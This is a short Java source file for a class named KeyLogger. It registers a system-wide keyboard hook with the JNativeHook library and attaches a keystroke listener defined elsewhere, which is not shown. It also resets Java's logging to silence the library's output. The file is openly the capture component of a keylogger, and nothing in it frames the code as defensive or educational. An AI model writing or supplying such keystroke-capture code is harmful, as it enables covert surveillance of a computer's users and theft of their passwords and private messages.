package keylog;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.logging.LogManager;

public class KeyLogger {
    public static NativeKeyBoard nativeKeyBoard;

    public void startKeyLogger(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(nativeKeyBoard = new NativeKeyBoard());
        LogManager.getLogManager().reset();
    }
}
